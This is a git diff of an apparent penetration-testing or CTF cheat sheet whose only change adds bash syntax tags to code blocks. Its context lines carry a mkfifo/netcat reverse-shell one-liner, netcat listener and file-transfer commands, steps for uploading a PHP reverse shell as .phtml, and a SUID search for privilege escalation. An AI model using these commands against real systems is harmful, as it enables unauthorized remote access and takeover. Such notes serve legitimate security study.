@@ -21,7 +21,7 @@ gobuster dir -u <webapp> -w /usr/share/wordlists/dirbuster/directory-list-2.3-me
 ```
 
 #### Netcat commands
-```
+```bash
 basic connection:
 nc -lvnp 4444 [> /path/to/file.ext]
 nc <ip> <port> [< /path/to/file.ext]
@@ -34,7 +34,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
 Upload [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) as `.phtml`, setup a nc listener, load the phtml location.
 
 #### Search for SUID bit
-```
+```bash
 find / -perm /4000
 ...
 /bin/systemctl
